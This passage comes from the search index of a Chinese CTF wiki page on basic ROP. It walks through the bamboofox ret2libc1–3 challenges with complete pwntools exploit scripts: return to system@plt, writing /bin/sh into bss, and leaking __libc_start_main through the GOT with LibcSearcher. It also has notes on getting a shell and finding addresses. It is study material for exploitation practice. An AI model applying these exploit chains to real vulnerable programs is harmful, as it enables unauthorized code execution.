\n0\n);\n\n  \nputs\n(\nRET2LIBC \n_\n);\n\n  \ngets\n((\nchar\n \n*\n)\nv4\n);\n\n  \nreturn\n \n0\n;\n\n\n}\n\n\n\n\n\n\u53ef\u4ee5\u770b\u5230\u5728\u6267\u884cgets\u51fd\u6570\u7684\u65f6\u5019\u51fa\u73b0\u4e86\u6808\u6ea2\u51fa\u3002\u6b64\u5916\uff0c\u5229\u7528ropgadget\uff0c\u6211\u4eec\u53ef\u4ee5\u67e5\u770b\u662f\u5426\u6709/bin/sh\u5b58\u5728\n\n\n\u279c  ret2libc1 ROPgadget --binary ret2libc1 --string \n/bin/sh\n          \nStrings \ninformation\n\n\n============================================================\n\n0x08048720 : /bin/sh\n\n\n\n\n\u786e\u5b9e\u5b58\u5728\uff0c\u518d\u6b21\u67e5\u627e\u4e00\u4e0b\u662f\u5426\u6709system\u51fd\u6570\u5b58\u5728\u3002\u7ecf\u5728ida\u4e2d\u67e5\u627e\uff0c\u786e\u5b9e\u4e5f\u5b58\u5728\u3002\n\n\n.plt:\n08048460\n \n; [00000006 BYTES: COLLAPSED FUNCTION _system. PRESS CTRL-NUMPAD+ TO EXPAND]\n\n\n\n\n\n\u90a3\u4e48\uff0c\u6211\u4eec\u76f4\u63a5\u8fd4\u56de\u8be5\u5904\uff0c\u5373\u6267\u884csystem\u51fd\u6570\u3002\u76f8\u5e94\u7684payload\u5982\u4e0b\n\n\n##!/usr/bin/env python\n\n\nfrom\n \npwn\n \nimport\n \n*\n\n\n\nsh\n \n=\n \nprocess\n(\n./ret2libc1\n)\n\n\n\nbinsh_addr\n \n=\n \n0x8048720\n\n\nsystem_plt\n \n=\n \n0x08048460\n\n\npayload\n \n=\n \nflat\n([\na\n \n*\n \n112\n,\n \nsystem_plt\n,\n \nb\n \n*\n \n4\n,\n \nbinsh_addr\n])\n\n\nsh\n.\nsendline\n(\npayload\n)\n\n\n\nsh\n.\ninteractive\n()\n\n\n\n\n\n\u8fd9\u91cc\u6211\u4eec\u9700\u8981\u6ce8\u610f\u51fd\u6570\u8c03\u7528\u6808\u7684\u7ed3\u6784\uff0c\u5982\u679c\u662f\u6b63\u5e38\u8c03\u7528system\u51fd\u6570\uff0c\u6211\u4eec\u8c03\u7528\u7684\u65f6\u5019\u4f1a\u6709\u4e00\u4e2a\u5bf9\u5e94\u7684\u8fd4\u56de\u5730\u5740\uff0c\u8fd9\u91cc\u4ee5'bbbb'\u4f5c\u4e3a\u865a\u5047\u7684\u5730\u5740\uff0c\u5176\u540e\u53c2\u6570\u5bf9\u5e94\u7684\u53c2\u6570\u5185\u5bb9\u3002\n\n\n\u8fd9\u4e2a\u4f8b\u5b50\uff0c\u76f8\u5bf9\u6765\u8bf4\uff0c\u6700\u4e3a\u7b80\u5355\uff0c\u540c\u65f6\u63d0\u4f9b\u4e86system\u5730\u5740\u4e0e/bin/sh\u7684\u5730\u5740\uff0c\u4f46\u662f\u5927\u591a\u6570\u7a0b\u5e8f\u5e76\u4e0d\u4f1a\u6709\u8fd9\u4e48\u597d\u7684\u60c5\u51b5\u3002\n\n\n\u4f8b2\n\n\n\u8fd9\u91cc\u4ee5bamboofox\u4e2d\u7684ret2libc2\u4e3a\u4f8b  \n\n\n\u70b9\u51fb\u4e0b\u8f7d: \nret2libc2\n\n\n\u8be5\u9898\u76ee\u4e0e\u4f8b1\u57fa\u672c\u4e00\u81f4\uff0c\u53ea\u4e0d\u8fc7\u4e0d\u518d\u51fa\u73b0/bin/sh\u5b57\u7b26\u4e32\uff0c\u6240\u4ee5\u6b64\u6b21\u9700\u8981\u6211\u4eec\u81ea\u5df1\u6765\u8bfb\u53d6\u5b57\u7b26\u4e32\uff0c\u6240\u4ee5\u6211\u4eec\u9700\u8981\u4e24\u4e2agadgets\uff0c\u7b2c\u4e00\u4e2a\u63a7\u5236\u7a0b\u5e8f\u8bfb\u53d6\u5b57\u7b26\u4e32\uff0c\u7b2c\u4e8c\u4e2a\u63a7\u5236\u7a0b\u5e8f\u6267\u884csystem(\"\"/bin/sh\")\u3002\u7531\u4e8e\u6f0f\u6d1e\u4e0e\u4e0a\u8ff0\u4e00\u81f4\uff0c\u8fd9\u91cc\u5c31\u4e0d\u5728\u591a\u8bf4\uff0c\u5177\u4f53\u7684exp\u5982\u4e0b\n\n\n##!/usr/bin/env python\n\n\nfrom\n \npwn\n \nimport\n \n*\n\n\n\nsh\n \n=\n \nprocess\n(\n./ret2libc2\n)\n\n\n\ngets_plt\n \n=\n \n0x08048460\n\n\nsystem_plt\n \n=\n \n0x08048490\n\n\npop_ebx\n \n=\n \n0x0804843d\n\n\nbuf2\n \n=\n \n0x804a080\n\n\npayload\n \n=\n \nflat\n(\n\n    \n[\na\n \n*\n \n112\n,\n \ngets_plt\n,\n \npop_ebx\n,\n \nbuf2\n,\n \nsystem_plt\n,\n \n0xdeadbeef\n,\n \nbuf2\n])\n\n\nsh\n.\nsendline\n(\npayload\n)\n\n\nsh\n.\nsendline\n(\n/bin/sh\n)\n\n\nsh\n.\ninteractive\n()\n\n\n\n\n\n\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u6211\u8fd9\u91cc\u5411\u7a0b\u5e8f\u4e2dbss\u6bb5\u7684buf2\u5904\u5199\u5165/bin/sh\u5b57\u7b26\u4e32\uff0c\u5e76\u5c06\u5176\u5730\u5740\u4f5c\u4e3asystem\u7684\u53c2\u6570\u4f20\u5165\u3002\u8fd9\u6837\u4ee5\u4fbf\u4e8e\u53ef\u4ee5\u83b7\u5f97shell\u3002\n\n\n\u4f8b3\n\n\n\u8fd9\u91cc\u4ee5bamboofox\u4e2d\u7684ret2libc3\u4e3a\u4f8b  \n\n\n\u70b9\u51fb\u4e0b\u8f7d: \nret2libc3\n\n\n\u5728\u4f8b2\u7684\u57fa\u7840\u4e0a\uff0c\u518d\u6b21\u5c06system\u51fd\u6570\u7684\u5730\u5740\u53bb\u6389\u3002\u6b64\u65f6\uff0c\u6211\u4eec\u9700\u8981\u540c\u65f6\u627e\u5230system\u51fd\u6570\u5730\u5740\u4e0e/bin/sh\u5b57\u7b26\u4e32\u7684\u5730\u5740\u3002\u9996\u5148\uff0c\u67e5\u770b\u5b89\u5168\u4fdd\u62a4\n\n\n\u279c  ret2libc3 checksec ret2libc3\n    Arch:     i386-32-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      No PIE \n(\n0x8048000\n)\n\n\n\n\n\n\u53ef\u4ee5\u770b\u51fa\uff0c\u6e90\u7a0b\u5e8f\u4ecd\u65e7\u5f00\u542f\u4e86\u5806\u6808\u4e0d\u53ef\u6267\u884c\u4fdd\u62a4\u3002\u8fdb\u800c\u67e5\u770b\u6e90\u7801\uff0c\u53d1\u73b0\u7a0b\u5e8f\u7684bug\u4ecd\u7136\u662f\u6808\u6ea2\u51fa\n\n\nint\n \n__cdecl\n \nmain\n(\nint\n \nargc\n,\n \nconst\n \nchar\n \n**\nargv\n,\n \nconst\n \nchar\n \n**\nenvp\n)\n\n\n{\n\n  \nint\n \nv4\n;\n \n// [sp+1Ch] [bp-64h]@1\n\n\n  \nsetvbuf\n(\nstdout\n,\n \n0\n,\n \n2\n,\n \n0\n);\n\n  \nsetvbuf\n(\nstdin\n,\n \n0\n,\n \n1\n,\n \n0\n);\n\n  \nputs\n(\nNo surprise anymore, system disappeard QQ.\n);\n\n  \nprintf\n(\nCan you find it !?\n);\n\n  \ngets\n((\nchar\n \n*\n)\nv4\n);\n\n  \nreturn\n \n0\n;\n\n\n}\n\n\n\n\n\n\u90a3\u4e48\u6211\u4eec\u5982\u4f55\u5f97\u5230system\u51fd\u6570\u7684\u5730\u5740\u5462\uff1f\u8fd9\u91cc\u5c31\u4e3b\u8981\u5229\u7528\u4e86\u4e24\u4e2a\u77e5\u8bc6\u70b9\n\n\n\n\nsystem\u51fd\u6570\u5c5e\u4e8elibc\uff0c\u800clibc.so\u6587\u4ef6\u4e2d\u7684\u51fd\u6570\u4e4b\u95f4\u76f8\u5bf9\u504f\u79fb\u662f\u56fa\u5b9a\u7684\u3002\n\n\n\u5373\u4f7f\u7a0b\u5e8f\u6709ASLR\u4fdd\u62a4\uff0c\u4e5f\u53ea\u662f\u9488\u5bf9\u4e8e\u5730\u5740\u4e2d\u95f4\u4f4d\u8fdb\u884c\u968f\u673a\uff0c\u6700\u4f4e\u768412\u4f4d\u5e76\u4e0d\u4f1a\u53d1\u751f\u6539\u53d8\u3002\u800clibc\u5728github\u4e0a\u6709\u4eba\u8fdb\u884c\u6536\u96c6\uff0c\u5177\u4f53\u7ec6\u8282\u5982\u4e0b\n\n\nhttps://github.com/niklasb/libc-database\n\n\n\n\n\u6240\u4ee5\u5982\u679c\u6211\u4eec\u77e5\u9053libc\u4e2d\u67d0\u4e2a\u51fd\u6570\u7684\u5730\u5740\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u786e\u5b9a\u8be5\u7a0b\u5e8f\u5229\u7528\u7684libc\u3002\u8fdb\u800c\u6211\u4eec\u5c31\u53ef\u4ee5\u77e5\u9053system\u51fd\u6570\u7684\u5730\u5740\u3002\n\n\n\u90a3\u4e48\u5982\u4f55\u5f97\u5230libc\u4e2d\u7684\u67d0\u4e2a\u51fd\u6570\u7684\u5730\u5740\u5462\uff1f\u6211\u4eec\u4e00\u822c\u5e38\u7528\u7684\u65b9\u6cd5\u662f\u91c7\u7528got\u8868\u6cc4\u9732\uff0c\u5373\u8f93\u51fa\u67d0\u4e2a\u51fd\u6570\u5bf9\u5e94\u7684got\u8868\u9879\u7684\u5185\u5bb9\u3002\n\u5f53\u7136\uff0c\u7531\u4e8elibc\u7684\u5ef6\u8fdf\u7ed1\u5b9a\u673a\u5236\uff0c\u6211\u4eec\u9700\u8981\u9009\u62e9\u5df2\u7ecf\u6267\u884c\u8fc7\u7684\u51fd\u6570\u6765\u8fdb\u884c\u6cc4\u9732\u3002\n\n\n\u6211\u4eec\u81ea\u7136\u53ef\u4ee5\u6839\u636e\u4e0a\u9762\u7684\u6b65\u9aa4\u5148\u5f97\u5230libc\uff0c\u4e4b\u540e\u5728\u7a0b\u5e8f\u4e2d\u67e5\u8be2\u504f\u79fb\uff0c\u7136\u540e\u518d\u6b21\u83b7\u53d6system\u5730\u5740\uff0c\u4f46\u8fd9\u6837\u624b\u5de5\u64cd\u4f5c\u6b21\u6570\u592a\u591a\uff0c\u6709\u70b9\u9ebb\u70e6\uff0c\u8fd9\u91cc\u7ed9\u51fa\u4e00\u4e2alibc\u7684\u5229\u7528\u5de5\u5177\uff0c\u5177\u4f53\u7ec6\u8282\u8bf7\u53c2\u8003readme\n\n\n\n\nhttps://github.com/lieanu/LibcSearcher\n\n\n\n\n\u6b64\u5916\uff0c\u5728\u5f97\u5230libc\u4e4b\u540e\uff0c\u5176\u5b9elibc\u4e2d\u4e5f\u662f\u6709/bin/sh\u5b57\u7b26\u4e32\u7684\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u4e00\u8d77\u83b7\u5f97/bin/sh\u5b57\u7b26\u4e32\u7684\u5730\u5740\u3002\n\n\n\u8fd9\u91cc\u6211\u4eec\u6cc4\u9732__libc_start_main\u7684\u5730\u5740\uff0c\u8fd9\u662f\u56e0\u4e3a\u5b83\u662f\u7a0b\u5e8f\u6700\u521d\u88ab\u6267\u884c\u7684\u5730\u65b9\u3002\u57fa\u672c\u5229\u7528\u601d\u8def\u5982\u4e0b\n\n\n\n\n\u6cc4\u9732__libc_start_main\u5730\u5740\n\n\n\u83b7\u53d6libc\u7248\u672c\n\n\n\u83b7\u53d6system\u5730\u5740\u4e0e/bin/sh\u7684\u5730\u5740\n\n\n\u518d\u6b21\u6267\u884c\u6e90\u7a0b\u5e8f\n\n\n\u89e6\u53d1\u6808\u6ea2\u51fa\u6267\u884csystem(\u2018/bin/sh\u2019)\n\n\n\n\nexp\u5982\u4e0b\n\n\n##!/usr/bin/env python\n\n\nfrom\n \npwn\n \nimport\n \n*\n\n\nfrom\n \nLibcSearcher\n \nimport\n \nLibcSearcher\n\n\nsh\n \n=\n \nprocess\n(\n./ret2libc3\n)\n\n\n\nret2libc3\n \n=\n \nELF\n(\n./ret2libc3\n)\n\n\n\nputs_plt\n \n=\n \nret2libc3\n.\nplt\n[\nputs\n]\n\n\nlibc_start_main_got\n \n=\n \nret2libc3\n.\ngot\n[\n__libc_start_main\n]\n\n\nmain\n \n=\n \nret2libc3\n.\nsymbols\n[\nmain\n]\n\n\n\nprint\n \nleak libc_start_main_got addr and return to main again\n\n\npayload\n \n=\n \nflat\n([\nA\n \n*\n \n112\n,\n \nputs_plt\n,\n \nmain\n,\n \nlibc_start_main_got\n])\n\n\nsh\n.\nsendlineafter\n(\nCan you find it !?\n,\n \npayload\n)\n\n\n\nprint\n \nget the related addr\n\n\nlibc_start_main_addr\n \n=\n \nu32\n(\nsh\n.\nrecv\n()[\n0\n:\n4\n])\n\n\nlibc\n \n=\n \nLibcSearcher\n(\n__libc_start_main\n,\n \nlibc_start_main_addr\n)\n\n\nlibcbase\n \n=\n \nlibc_start_main_addr\n \n-\n \nlibc\n.\ndump\n(\n__libc_start_main\n)\n\n\nsystem_addr\n \n=\n \nlibcbase\n \n+\n \nlibc\n.\ndump\n(\nsystem\n)\n\n\nbinsh_addr\n \n=\n \nlibcbase\n \n+\n \nlibc\n.\ndump\n(\nstr_bin_sh\n)\n\n\n\nprint\n \nget shell\n\n\npayload\n \n=\n \nflat\n([\nA\n \n*\n \n104\n,\n \nsystem_addr\n,\n \n0xdeadbeef\n,\n \nbinsh_addr\n])\n\n\nsh\n.\nsendline\n(\npayload\n)\n\n\n\nsh\n.\ninteractive\n()\n\n\n\n\n\n\u9898\u76ee\n\n\n\n\ntrain.cs.nctu.edu.tw ret2libc\n\n\n\n\nshell\u83b7\u53d6\u5c0f\u7ed3\n\n\n\u8fd9\u91cc\u603b\u7ed3\u51e0\u79cd\u5e38\u89c1\u7684\u83b7\u53d6shell\u7684\u65b9\u5f0f\uff1a\n\n\n\n\n\u6267\u884cshellcode\uff0c\u8fd9\u4e00\u65b9\u9762\u4e5f\u4f1a\u6709\u4e0d\u540c\u7684\u60c5\u51b5\n\n\n\u53ef\u4ee5\u76f4\u63a5\u8fd4\u56deshell\n\n\n\u53ef\u4ee5\u5c06shell\u8fd4\u56de\u5230\u67d0\u4e00\u4e2a\u7aef\u53e3\n\n\nshellcode\u4e2d\u5b57\u7b26\u6709\u65f6\u5019\u9700\u8981\u6ee1\u8db3\u4e0d\u540c\u7684\u9700\u6c42\n\n\n\u6ce8\u610f\uff0c\u6211\u4eec\u9700\u8981\u5c06shellcode\u5199\u5728\u53ef\u4ee5\u6267\u884c\u7684\u5185\u5b58\u533a\u57df\u4e2d\u3002\n\n\n\n\n\n\n\u6267\u884c system(\"/bin/sh\"), system('sh') \u7b49\u7b49\n\n\n\u5173\u4e8e system \u7684\u5730\u5740\uff0c\u53c2\u89c1\u4e0b\u9762\u7ae0\u8282\u7684\n\u5730\u5740\u5bfb\u627e\n\u3002\n\n\n\u5173\u4e8e \"/bin/sh\"\uff0c \u201csh\u201d\n\n\n\u9996\u5148\u5bfb\u627e binary \u91cc\u9762\u6709\u6ca1\u6709\u5bf9\u5e94\u7684\u5b57\u7b26\u4e32\uff0c\n\u6bd4\u5982\u8bf4\u6709 flush \u51fd\u6570\uff0c\u90a3\u5c31\u4e00\u5b9a\u6709 sh \u4e86\n\n\n\u8003\u8651\u4e2a\u4eba\u8bfb\u53d6\u5bf9\u5e94\u5b57\u7b26\u4e32\n\n\nlibc \u4e2d\u5176\u5b9e\u662f\u6709 /bin/sh \u7684\n\n\n\n\n\n\n\u4f18\u70b9\n\n\n\u53ea\u9700\u8981\u4e00\u4e2a\u53c2\u6570\u3002\n\n\n\n\n\n\n\u7f3a\u70b9\n\n\n\u6709\u53ef\u80fd\u56e0\u4e3a\u7834\u574f\u73af\u5883\u53d8\u91cf\u800c\u65e0\u6cd5\u6267\u884c\u3002\n\n\n\n\n\n\n\n\n\n\n\u6267\u884c execve(\"/bin/sh\",NULL,NULL)\n\n\n\u524d\u51e0\u6761\u540c system\n\n\n\u4f18\u70b9\n\n\n\u51e0\u4e4e\u4e0d\u53d7\u73af\u5883\u53d8\u91cf\u7684\u5f71\u54cd\u3002\n\n\n\n\n\n\n\u7f3a\u70b9\n\n\n\u9700\u8981 3 \u4e2a\u53c2\u6570\u3002\n\n\n\n\n\n\n\n\n\n\n\u7cfb\u7edf\u8c03\u7528\n\n\n\u7cfb\u7edf\u8c03\u7528\u53f7\n__NR_execve\n\u5728IA-32\u4e2d\u4e3a11\uff0cx86-64\u4e3a59\n\n\n\n\n\n\n\n\n\u5730\u5740\u5bfb\u627e\u5c0f\u7ed3\n\n\n\u5728\u6574\u4e2a\u6f0f\u6d1e\u5229\u7528\u8fc7\u7a0b\u4e2d\uff0c\u6211\u4eec\u603b\u662f\u514d\u4e0d\u4e86\u8981\u53bb\u5bfb\u627e\u4e00\u4e9b\u5730\u5740\uff0c\u5e38\u89c1\u7684\u5bfb\u627e\u5730\u5740\u7684\u7c7b\u578b\uff0c\u6709\u5982\u4e0b\u51e0\u79cd\n\n\n\u901a\u7528\u5bfb\u627e\n\n\n\u76f4\u63a5\u5730\u5740\u5bfb\u627e\n\n\n\u7a0b\u5e8f\u4e2d\u5df2\u7ecf\u7ed9\u51fa\u4e86\u76f8\u5173\u53d8\u91cf\u6216\u8005\u51fd\u6570\u7684\u5730\u5740\u4e86\u3002\u8fd9\u65f6\u5019\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u76f4\u63a5\u8fdb\u884c\u5229\u7528\u4e86\u3002\n\n\ngot\u8868\u5bfb\u627e\n\n\n\u6709\u65f6\u5019\u6211\u4eec\u5e76\u4e0d\u4e00\u5b9a\u975e\u5f97\u76f4\u63a5\u77e5\u9053\u67d0\u4e2a\u51fd\u6570\u7684\u5730\u5740\uff0c\u53ef\u4ee5\u5229\u7528GOT\u8868\u7684\u8df3\u8f6c\u5230\u5bf9\u5e94\u51fd\u6570\u7684\u5730\u5740\u3002\u5f53\u7136\uff0c\u5982\u679c\u6211\u4eec\u975e\u5f97\u77e5\u9053\u8fd9\u4e2a\u51fd\u6570\u7684\u5730\u5740\uff0c\u6211\u4eec\u53ef\u4ee5\u5229\u7528write\uff0cputs\u7b49\u8f93\u51fa\u51fd\u6570\u5c06GOT\u8868\u4e2d\u5730\u5740\u5904\u5bf9\u5e94\u7684\u5185\u5bb9\u8f93\u51fa\u51fa\u6765\uff08\n\u524d\u63d0\u662f\u8fd9\u4e2a\u51fd\u6570\u5df2\u7ecf\u88ab\u89e3\u6790\u4e00\u6b21\u4e86\n\uff09\u3002\n\n\n\u6709libc\n\n\n\u76f8\u5bf9\u504f\u79fb\u5bfb\u627e\n\uff0c\u8fd9\u65f6\u5019\u6211\u4eec\u5c31\u9700\u8981\u8003\u8651\u5229\u7528libc\u4e2d\u51fd\u6570\u7684\u57fa\u5730\u5740\u4e00\u6837\u8fd9\u4e2a\u7279\u6027\u6765\u5bfb\u627e\u4e86\u3002\u5176\u5b9e__libc_start_main\u5c31\u662flibc\u5728\u5185\u5b58\u4e2d\u7684\u57fa\u5730\u5740\u3002\n\u6ce8\u610f\uff1a\u4e0d\u8981\u9009\u62e9\u6709wapper\u7684\u51fd\u6570\uff0c\u8fd9\u6837\u4f1a\u4f7f\u5f97\u51fd\u6570\u7684\u57fa\u5730\u5740\u8ba1\u7b97\u4e0d\u6b63\u786e\u3002\n\u5e38\u89c1\u7684\u6709wapper\u7684\u51fd\u6570\u6709\uff08\u5f85\u8865\u5145\uff09\u3002\n\n\n\u65e0libc\n\n\n\u5176\u5b9e\uff0c\u8fd9\u79cd\u60c5\u51b5\u7684\u89e3\u51b3\u7b56\u7565\u5206\u4e3a\u4e24\u79cd\n\n\n\n\n\u60f3\u529e\u6cd5\u83b7\u53d6libc\n\n\n\u60f3\u529e\u6cd5\u76f4\u63a5\u83b7\u53d6\u5bf9\u5e94\u7684\u5730\u5740\u3002\n\n\n\n\n\u800c\u5bf9\u4e8e\u60f3\u8981\u6cc4\u9732\u7684\u5730\u5740\uff0c\u6211\u4eec\u53ea\u662f\u5355\u7eaf\u5730\u9700\u8981\u5176\u5bf9\u5e94\u7684\u5185\u5bb9\uff0c\u6240\u4ee5puts\u548cwrite\u5747\u53ef\u4ee5\u3002\n\n\n\n\nputs\u4f1a\u6709\\x00\u622a\u65ad\u7684\u95ee\u9898\n\n\nwrite\u53ef\u4ee5\u6307\u5b9a\u957f\u5ea6\u8f93\u51fa\u7684\u5185\u5bb9\u3002\n\n\n\n\n\u4e0b\u9762\u662f\u4e00\u4e9b\u76f8\u5e94\u7684\u65b9\u6cd5\n\n\npwnlib.dynelf\n\n\n\u524d\u63d0\u662f\u6211\u4eec\u53ef\u4ee5\u6cc4\u9732\u4efb\u610f\u5730\u5740\u7684\u5185\u5bb9\u3002\n\n\n\n\n\u5982\u679c\u8981\u4f7f\u7528write\u51fd\u6570\u6cc4\u9732\u7684\u8bdd\uff0c\u4e00\u6b21\u6700\u597d\u591a\u8f93\u51fa\u4e00\u4e9b\u5730\u5740\u7684\u5185\u5bb9\uff0c\u56e0\u4e3a\u6211\u4eec\u4e00\u822c\u662f\u53ea\u662f\u4e0d\u65ad\u5730\u5411\u9ad8\u5730\u5740\u8bfb\u5185\u5bb9\uff0c\u5f88\u6709\u53ef\u80fd\u5bfc\u81f4\u9ad8\u5730\u5740\u7684\u73af\u5883\u53d8\u91cf\u88ab\u8986\u76d6\uff0c\u5c31\u4f1a\u5bfc\u81f4shell\u4e0d\u80fd\u542f\u52a8\u3002\n\n\n\n\nlibc\u6570\u636e\u5e93\n\n\n## \u66f4\u65b0\u6570\u636e\u5e93\n\n./get\n\n## \u5c06\u5df2\u6709libc\u6dfb\u52a0\u5230\u6570\u636e\u5e93\u4e2d\n\n./add libc.so \n\n## Find all the libc\ns in the database that have the given names at the given addresses. \n\n./find function1 addr function2 addr\n\n## Dump some useful offsets, given a libc ID. You can also provide your own names to dump.\n\n./dump __libc_start_main_ret system dup2\n\n\n\n\n\u53bblibc\u7684\u6570\u636e\u5e93\u4e2d\u627e\u5230\u5bf9\u5e94\u7684\u548c\u5df2\u7ecf\u51fa\u73b0\u7684\u5730\u5740\u4e00\u6837\u7684libc\uff0c\u8fd9\u65f6\u5019\u5f88\u6709\u53ef\u80fd\u662f\u4e00\u6837\u7684\u3002\n\n\n\n\nlibcdb.com\n\n\n\n\n\u5f53\u7136\uff0c\u8fd8\u6709\u4e0a\u9762\u63d0\u5230\u7684https://github.com/lieanu/LibcSearcher\u3002\n\n\nret2dl-resolve\n\n\n\u5f53ELF\u6587\u4ef6\u91c7\u7528\u52a8\u6001\u94fe\u63a5\u65f6\uff0cgot\u8868\u4f1a\u91c7\u7528\u5ef6\u8fdf\u7ed1\u5b9a\u6280\u672f\u3002\u5f53\u7b2c\u4e00\u6b21\u8c03\u7528\u67d0\u4e2alibc\u51fd\u6570\u65f6\uff0c\u7a0b\u5e8f\u4f1a\u8c03\u7528_dl_runtime_resolve\u51fd\u6570\u5bf9\u5176\u5730\u5740\u89e3\u6790\u3002\u56e0\u6b64\uff0c\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u6808\u6ea2\u51fa\u6784\u9020ROP\u94fe\uff0c\u4f2a\u9020\u5bf9\u5176\u4ed6\u51fd\u6570\uff08\u5982\uff1asystem\uff09\u7684\u89e3\u6790\u3002\u8fd9\u4e5f\u662f\u6211\u4eec\u5728\u9ad8\u7ea7rop\u4e2d\u4f1a\u4ecb\u7ecd\u7684\u6280\u5de7\u3002\n\n\n\u9898\u76ee\n\n\n\n\ntrain.cs.nctu.edu.tw\n\n\nrop\n\n\n2013-PlaidCTF-ropasaurusrex\n\n\nDefcon 2015 Qualifier: R0pbaby\n\n\n\n\n\u53c2\u8003\u9605\u8bfb\n\n\n\n\n\u4e4c\u4e91\u4e00\u6b65\u4e00\u6b65ROP\u7bc7(\u84b8\u7c73)\n\n\n\u624b\u628a\u624b\u6559\u4f60\u6808\u6ea2\u51fa\u4ece\u5165\u95e8\u5230\u653e\u5f03\uff08\u4e0a\uff09\n\n\n\u624b\u628a\u624b\u6559\u4f60\u6808\u6ea2\u51fa\u4ece\u5165\u95e8\u5230\u653e\u5f03\uff08\u4e0b\uff09\n\n\n \u3010\u6280\u672f\u5206\u4eab\u3011\u73b0\u4ee3\u6808\u6ea2\u51fa\u5229\u7528\u6280\u672f\u57fa\u7840\uff1aROP", 
            "title": "\u57fa\u672c ROP"
        }, 
        {
            "location": "/pwn/stackoverflow/basic_rop/#rop", 
            "text": "\u968f\u7740NX\u4fdd\u62a4\u7684\u5f00\u542f\uff0c\u4ee5\u5f80\u76f4\u63a5\u5411\u6808\u6216\u8005\u5806\u4e0a\u76f4\u63a5\u6ce8\u5165\u4ee3\u7801\u7684\u65b9\u5f0f\u96be\u4ee5\u7ee7\u7eed\u53d1\u6325\u6548\u679c\u3002\u653b\u51fb\u8005\u4eec\u4e5f\u63d0\u51fa\u6765\u76f8\u5e94\u7684\u65b9\u6cd5\u6765\u7ed5\u8fc7\u4fdd\u62a4\uff0c\u76ee\u524d\u4e3b\u8981\u7684\u662fROP(Return Oriented Programming)\uff0c\u5176\u4e3b\u8981\u601d\u60f3\u662f\u5728 \u6808\u7f13\u51b2\u533a\u6ea2\u51fa\u7684\u57fa\u7840\u4e0a(\u8fd9\u4e00\u6761\u4e4b\u540e\u4e0d\u518d\u91cd\u590d\u63d0\u53ca)\uff0c\u901a\u8fc7\u5229\u7528\u7a0b\u5e8f\u4e2d\u5df2\u6709\u7684\u5c0f\u7247\u6bb5(gadgets)\u6765\u6539\u53d8\u67d0\u4e9b\u5bc4\u5b58\u5668\u6216\u8005\u53d8\u91cf\u7684\u503c\uff0c\u4ece\u800c\u6539\u53d8\u7a0b\u5e8f\u7684\u6267\u884c\u6d41\u7a0b\u3002 \u6240\u8c13gadgets\u5c31\u662f\u4ee5ret\u7ed3\u5c3e\u7684\u6307\u4ee4\u5e8f\u5217\uff0c\u901a\u8fc7\u8fd9\u4e9b\u6307\u4ee4\u5e8f\u5217\uff0c\u6211\u4eec\u53ef\u4ee5\u4fee\u6539\u67d0\u4e9b\u5730\u5740\u7684\u5185\u5bb9\uff0c\u65b9\u4fbf\u63a7\u5236\u7a0b\u5e8f\u7684\u6267\u884c\u6d41\u7a0b\u3002  \u4e4b\u6240\u4ee5\u79f0\u4e4b\u4e3aROP\uff0c\u662f\u56e0\u4e3a\u6838\u5fc3\u5728\u4e8e\u5229\u7528\u4e86\u6307\u4ee4\u96c6\u4e2d\u7684ret\u6307\u4ee4\uff0c\u6539\u53d8\u4e86\u6307\u4ee4\u6d41\u7684\u6267\u884c\u987a\u5e8f\u3002ROP\u653b\u51fb\u4e00\u822c\u5f97\u6ee1\u8db3\u5982\u4e0b\u6761\u4ef6   \u7a0b\u5e8f\u5b58\u5728\u6ea2\u51fa\uff0c\u5e76\u4e14\u53ef\u4ee5\u63a7\u5236\u8fd4\u56de\u5730\u5740\u3002  \u53ef\u4ee5\u627e\u5230\u6ee1\u8db3\u6761\u4ef6\u7684gadgets\u4ee5\u53ca\u76f8\u5e94gadgets\u7684\u5730\u5740\u3002\u5982\u679c\u5f53\u7a0b\u5e8f\u5f00\u542f\u4e86PIE\u4fdd\u62a4\uff0c\u90a3\u4e48\u5c31\u5fc5\u987b\u60f3\u529e\u6cd5\u6cc4\u9732gadgets\u7684\u5730\u5740\u4e86\u3002", 
            "title": "\u57fa\u672cROP"
        }, 
        {
            "location": "/pwn/stackoverflow/basic_rop/#ret2text", 
            "text": "", 
            "title": "ret2text"
        }, 
        {
            "location": "/pwn/stackoverflow/basic_rop/#_1", 
            "text": "ret2text\u5373\u9700\u8981\u6211\u4eec\u63a7\u5236\u7a0b\u5e8f\u6267\u884c\u7a0b\u5e8f\u672c\u8eab\u5df2\u6709\u7684\u7684\u4ee3\u7801(.text)\u3002\u5176\u5b9e\uff0c\u8fd9\u79cd\u653b\u51fb\u65b9\u6cd5\u662f\u4e00\u79cd\u7b3c\u7edf\u7684\u63cf\u8ff0\u3002\u6211\u4eec\u63a7\u5236\u6267\u884c\u7a0b\u5e8f\u5df2\u6709\u7684\u4ee3\u7801\u7684\u65f6\u5019\u4e5f\u53ef\u4ee5\u63a7\u5236\u7a0b\u5e8f\u6267\u884c\u597d\u51e0\u6bb5\u4e0d\u76f8\u90bb\u7684\u7a0b\u5e8f\u5df2\u6709\u7684\u4ee3\u7801(\u4e5f\u5c31\u662fgadgets)\uff0c\u8fd9\u5c31\u662f\u6211\u4eec\u6240\u8981\u8bf4\u7684rop\u3002  \u8fd9\u65f6\uff0c\u6211\u4eec\u9700\u8981\u77e5\u9053\u5bf9\u5e94\u8fd4\u56de\u7684\u4ee3\u7801\u7684\u4f4d\u7f6e\u3002\u5f53\u7136\u7a0b\u5e8f\u4e5f\u53ef\u80fd\u4f1a\u5f00\u542f\u67d0\u4e9b\u4fdd\u62a4\uff0c\u6211\u4eec\u9700\u8981\u60f3\u529e\u6cd5\u53bb\u7ed5\u8fc7\u8fd9\u4e9b\u4fdd\u62a4\u3002", 
            "title": "\u539f\u7406"
        }, 
        {
            "location": "/pwn/stackoverflow/basic_rop/#_2", 
